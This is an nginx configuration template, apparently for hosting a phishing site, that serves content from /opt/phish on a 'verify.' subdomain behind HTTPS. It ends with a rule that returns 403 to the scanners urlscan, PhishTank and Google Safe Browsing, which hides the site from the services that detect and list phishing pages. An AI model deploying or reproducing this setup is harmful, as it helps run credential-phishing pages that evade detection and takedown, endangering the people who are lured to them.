server {
    listen 80;
    server_name verify.@@DOMAIN@@;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name verify.@@DOMAIN@@;

    ssl_certificate     /etc/letsencrypt/live/verify.@@DOMAIN@@/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/verify.@@DOMAIN@@/privkey.pem;

    location /static/ {
        alias /opt/phish/static/;
        access_log off;
        expires 1h;
    }

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header CF-Connecting-IP  $http_cf_connecting_ip;
    }

    if ($http_user_agent ~* (urlscan|phishtank|safebrowsing)) {
        return 403;
    }
}